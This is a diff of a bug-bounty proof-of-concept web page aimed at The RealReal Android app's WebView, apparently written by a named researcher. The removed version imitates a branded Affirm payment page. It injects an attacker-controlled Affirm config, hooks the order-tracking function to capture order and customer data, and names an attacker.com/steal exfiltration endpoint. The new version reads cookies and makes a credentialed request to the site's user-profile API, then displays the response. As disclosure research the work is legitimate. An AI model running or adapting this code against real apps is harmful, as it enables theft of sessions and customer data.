@@ -1,322 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Processing - The RealReal</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f8f9fa;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            padding: 30px;
-        }
-        
-        .logo {
-            text-align: center;
-            font-size: 24px;
-            font-weight: bold;
-            color: #000;
-            margin-bottom: 30px;
-            letter-spacing: -0.5px;
-        }
-        
-        .affirm-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            padding: 12px;
-            background: #0FA0EA;
-            color: white;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        
-        .processing {
-            text-align: center;
-            padding: 30px 0;
-        }
-        
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #0FA0EA;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .status {
-            color: #666;
-            font-size: 16px;
-            margin-bottom: 10px;
-        }
-        
-        .log-container {
-            margin-top: 30px;
-            padding: 20px;
-            background: #f8f9fa;
-            border-radius: 8px;
-            border-left: 4px solid #dc3545;
-        }
-        
-        .log-title {
-            font-weight: bold;
-            color: #dc3545;
-            margin-bottom: 10px;
-            font-size: 14px;
-        }
-        
-        .log-entry {
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            color: #495057;
-            margin: 5px 0;
-            word-break: break-all;
-        }
-        
-        .success {
-            color: #28a745;
-            font-weight: bold;
-        }
-        
-        .warning {
-            background: #fff3cd;
-            border-left-color: #ffc107;
-            padding: 15px;
-            border-radius: 4px;
-            margin-top: 20px;
-            font-size: 13px;
-            color: #856404;
-        }
-        
-        .warning strong {
-            display: block;
-            margin-bottom: 5px;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>WebView Session Test</title>
+<style>
+body {
+  font-family: monospace;
+  background: #111;
+  color: #0f0;
+  padding: 20px;
+}
+pre {
+  white-space: pre-wrap;
+  word-wrap: break-word;
+}
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">THE REALREAL</div>
-        
-        <div class="affirm-badge">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-            </svg>
-            <span>Secured by Affirm</span>
-        </div>
-        
-        <div class="processing">
-            <div class="spinner"></div>
-            <div class="status">Processing your payment...</div>
-            <div id="sub-status" style="font-size: 14px; color: #999;"></div>
-        </div>
-        
-        <div class="log-container">
-            <div class="log-title">🚨 SECURITY RESEARCH - PoC ACTIVE</div>
-            <div id="log"></div>
-        </div>
-        
-        <div class="warning">
-            <strong>⚠️ Bug Bounty Research</strong>
-            This is a proof-of-concept demonstrating WebView vulnerabilities in The RealReal Android app. No real payment data is being collected. Researcher: keylor (H1: keylorx)
-        </div>
-    </div>
 
-    <script>
-        // PoC: Malicious Affirm Integration
-        // This demonstrates how an attacker could intercept payment tracking data
-        
-        const log = document.getElementById('log');
-        const subStatus = document.getElementById('sub-status');
-        
-        function addLog(message, isSuccess = false) {
-            const entry = document.createElement('div');
-            entry.className = 'log-entry' + (isSuccess ? ' success' : '');
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            log.appendChild(entry);
-            log.scrollTop = log.scrollHeight;
-        }
-        
-        function updateStatus(message) {
-            subStatus.textContent = message;
-        }
-        
-        // Simulate processing steps
-        setTimeout(() => {
-            addLog('WebView loaded successfully');
-            updateStatus('Initializing payment system...');
-        }, 500);
-        
-        setTimeout(() => {
-            addLog('Affirm API initialized');
-            updateStatus('Connecting to payment gateway...');
-        }, 1500);
-        
-        // MALICIOUS AFFIRM CONFIG
-        setTimeout(() => {
-            addLog('⚠️ Malicious Affirm config injected');
-            
-            window._affirm_config = {
-                public_api_key: "ATTACKER_CONTROLLED_KEY",
-                script: "https://keylorx.github.io/solohunter/collect.js"
-            };
-            
-            addLog('Config: ' + JSON.stringify(window._affirm_config).substring(0, 50) + '...');
-            updateStatus('Payment method verified...');
-        }, 2500);
-        
-        // HOOK AFFIRM ANALYTICS
-        setTimeout(() => {
-            addLog('⚠️ Hooking affirm.analytics.trackOrderConfirmed()');
-            
-            window.affirm = {
-                ui: {
-                    ready: function(callback) {
-                        addLog('affirm.ui.ready() called');
-                        callback();
-                    }
-                },
-                analytics: {
-                    trackOrderConfirmed: function(orderData, productData) {
-                        addLog('🎯 INTERCEPTED: trackOrderConfirmed() called!', true);
-                        
-                        // This is what would be exfiltrated
-                        const stolen = {
-                            order: orderData,
-                            products: productData,
-                            timestamp: new Date().toISOString(),
-                            source: 'TheRealReal Android WebView'
-                        };
-                        
-                        addLog('📦 Order Data Captured: ' + JSON.stringify(stolen).substring(0, 80) + '...');
-                        
-                        // In real attack, this would exfiltrate to attacker server
-                        // fetch('https://attacker.com/steal', {
-                        //     method: 'POST',
-                        //     body: JSON.stringify(stolen)
-                        // });
-                        
-                        addLog('💀 Data would be sent to: https://attacker.com/steal', true);
-                        addLog('✅ PoC Complete - Payment data intercepted!', true);
-                        
-                        updateStatus('Payment confirmed ✓');
-                    }
-                }
-            };
-            
-            addLog('Hook installed successfully', true);
-            updateStatus('Processing order...');
-        }, 3500);
-        
-        // SIMULATE APP CALLING AFFIRM
-        setTimeout(() => {
-            addLog('📱 App calls affirm.analytics.trackOrderConfirmed()');
-            
-            // Simulate the app calling the function we hooked
-            if (window.affirm && window.affirm.analytics) {
-                window.affirm.analytics.trackOrderConfirmed(
-                    {
-                        orderId: 'TRR-2026-12345',
-                        total: 1299.99,
-                        currency: 'USD',
-                        customerEmail: 'victim@example.com'
-                    },
-                    [
-                        {
-                            name: 'Gucci Handbag',
-                            sku: 'GUC-12345',
-                            price: 1299.99
-                        }
-                    ]
-                );
-            }
-        }, 5000);
-        
-        // ATTEMPT TO ACCESS COOKIES/STORAGE
-        setTimeout(() => {
-            addLog('🍪 Attempting to access cookies...');
-            
-            if (document.cookie) {
-                addLog('Cookies accessible: ' + document.cookie.substring(0, 50) + '...');
-            } else {
-                addLog('No cookies accessible (different context)');
-            }
-            
-            try {
-                const storage = localStorage.getItem('trr_session');
-                if (storage) {
-                    addLog('localStorage accessible!', true);
-                } else {
-                    addLog('localStorage empty or restricted');
-                }
-            } catch (e) {
-                addLog('localStorage blocked: ' + e.message);
-            }
-        }, 6000);
-        
-        // TRY FETCH TO MAIN DOMAIN
-        setTimeout(() => {
-            addLog('🌐 Attempting fetch to therealreal.com...');
-            
-            fetch('https://www.therealreal.com/api/user/profile', {
-                credentials: 'include'
-            })
-            .then(response => {
-                addLog('Fetch successful! Status: ' + response.status, true);
-                if (response.ok) {
-                    addLog('⚠️ Could access authenticated endpoints!', true);
-                }
-                return response.text();
-            })
-            .then(data => {
-                addLog('Response preview: ' + data.substring(0, 100) + '...');
-            })
-            .catch(error => {
-                addLog('Fetch blocked (expected): ' + error.message);
-            });
-        }, 7000);
-        
-        // FINAL STATUS
-        setTimeout(() => {
-            addLog('');
-            addLog('═══════════════════════════════════════', true);
-            addLog('PoC SUMMARY:', true);
-            addLog('✓ WebView loaded attacker-controlled page', true);
-            addLog('✓ JavaScript executed in app context', true);
-            addLog('✓ Affirm payment hooks intercepted', true);
-            addLog('✓ Order data would be exfiltrated', true);
-            addLog('═══════════════════════════════════════', true);
-            addLog('');
-            addLog('Impact: Payment tracking data interception');
-            addLog('Researcher: keylor (keylorx@wearehackerone.com)');
-            addLog('Report: The RealReal Android Deep Link Security');
-            
-            updateStatus('PoC completed successfully ✓');
-        }, 9000);
-    </script>
+<h2>WebView Auth Test</h2>
+<button onclick="testAuth()">Run Test</button>
+
+<pre id="output">Waiting...</pre>
+
+<script>
+function log(msg) {
+  document.getElementById("output").textContent += "\n\n" + msg;
+}
+
+async function testAuth() {
+  document.getElementById("output").textContent = "Testing...";
+
+  try {
+    log("1️⃣ Checking cookies...");
+    log("document.cookie = " + document.cookie);
+
+    log("2️⃣ Attempting authenticated API request...");
+
+    const response = await fetch(
+      "https://www.therealreal.com/api/user/profile",
+      { credentials: "include" }
+    );
+
+    log("Status: " + response.status);
+
+    const text = await response.text();
+    log("Response length: " + text.length);
+    log("Response preview:\n" + text.substring(0, 500));
+
+  } catch (e) {
+    log("Error: " + e.toString());
+  }
+}
+</script>
+
 </body>
 </html>
